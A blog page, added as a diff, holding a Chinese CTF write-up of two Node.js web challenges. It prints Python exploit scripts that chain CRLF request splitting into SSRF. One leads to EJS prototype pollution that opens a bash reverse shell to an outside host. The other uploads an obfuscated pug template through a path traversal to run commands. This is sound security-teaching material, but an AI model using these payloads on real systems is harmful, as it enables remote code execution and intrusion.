@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>【西湖论剑 2022】real_ez_node 复盘 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>【西湖论剑 2022】real_ez_node 复盘</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/11
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/node-js/" style="color: #ff7d73">node.js</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>半年前说要学node 到现在还是b动静没有</p>
+<h1 id="西湖论剑-2022-real-ez-node"><a href="#西湖论剑-2022-real-ez-node" class="headerlink" title="[西湖论剑 2022]real_ez_node"></a>[西湖论剑 2022]real_ez_node</h1><p>给了源码 node8.1.2<br>初步看下来要ssrf打原型链污染<br>&#x2F;路由下是<code>this is ejs</code><br>可以往ejs的原型链污染去考虑</p>
+<p>但是问题来了<br>上哪儿去ssrf<br>&#x2F;curl路由只有参数q可控<br><img src="https://img-blog.csdnimg.cn/direct/8a843cd75bef4e78a75c81ce08b9fba1.png" alt="在这里插入图片描述"><br>考虑CRLF拆分攻击<br><img src="https://img-blog.csdnimg.cn/direct/0dfba27b3d2743ed899931ce9e02ed32.png" alt="在这里插入图片描述"><br>污染点在<br><img src="https://img-blog.csdnimg.cn/direct/b869e8c7b7f84993a0509f454af8a2c8.png" alt="在这里插入图片描述"><br>手动POST &#x2F;copy<br>拿到数据包删掉点无关紧要的东西<br>然后就可以构造了<br><code>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2</code></p>
+<pre><code class="py">import urllib.parse
+import requests
+
+payload = &#39;&#39;&#39;HTTP/1.1
+
+POST /copy HTTP/1.1
+Host: 127.0.0.1:3000
+Content-Type: application/json
+Content-Length: 192
+
+&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;
+
+GET /&#39;&#39;&#39;
+payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
+    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)
+
+
+payload = urllib.parse.quote(payload)
+
+print(payload)
+url = &quot;http://node4.anna.nssctf.cn:28814/curl?q=&quot;
+requests.get(url+payload)
+</code></pre>
+<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>这里顺便给[GYCTF2020]Node Game做了<br><img src="https://img-blog.csdnimg.cn/direct/47c756b052304c6383cfc905ecd55ef4.png" alt="在这里插入图片描述"><br>模板是pug<br>&#x2F;core可以ssrf<br>&#x2F;file_upload有一个文件上传<br>根路径下传action参数可以访问任意模板</p>
+<p>那么可以考虑上传一个恶意的pug然后根目录去访问<br><img src="https://img-blog.csdnimg.cn/direct/a9724e2e618543718d45ea2641c48dc8.png" alt="在这里插入图片描述"><br>上传路径在uploads下 可以通过构造mimetype来路径穿越</p>
+<p>先抓一个上传的包</p>
+<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
+- return x
+</code></pre>
+<p>完事改脚本</p>
+<pre><code class="py">import urllib.parse
+import requests
+
+# payload = &#39;&#39;&#39;HTTP/1.1
+
+# POST /file_upload HTTP/1.1
+# Host: 127.0.0.1:8081
+# Content-Length: 331
+# Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCOrILUaqwgT7T9GT
+
+# ------WebKitFormBoundaryCOrILUaqwgT7T9GT
+# Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
+# Content-Type: ../template
+
+# -var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)
+# -return x
+# ------WebKitFormBoundaryCOrILUaqwgT7T9GT--
+
+# GET /&#39;&#39;&#39;
+payload =&#39;&#39;&#39;HTTP/1.1
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA
+Content-Length: 301
+Host: 127.0.0.1:8081
+
+------WebKitFormBoundaryO9LPoNAg9lWRUItA
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
+Content-Type: ../template
+
+- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
+- return x
+------WebKitFormBoundaryO9LPoNAg9lWRUItA--
+
+
+GET /&#39;&#39;&#39;
+payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
+    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)
+
+
+payload = urllib.parse.quote(payload)
+
+
+url = &quot;http://4b5ed9ad-6e1e-4336-91a3-4bffc35ea376.node5.buuoj.cn:81/core?q=&quot;
+print(url+payload)
+res = requests.get(url+payload)
+print(res.text)
+
+</code></pre>
+<p>此时访问&#x2F;?action&#x3D;shell<br><img src="https://img-blog.csdnimg.cn/direct/cf0c6324b4b3480fba39e1fa24c7b81f.png" alt="在这里插入图片描述"><br>修改pug</p>
+<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat f*&#39;)&quot;)
+- return x
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/direct/9cf32449b61c47eaaf37ace260ee67ab.png" alt="在这里插入图片描述"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
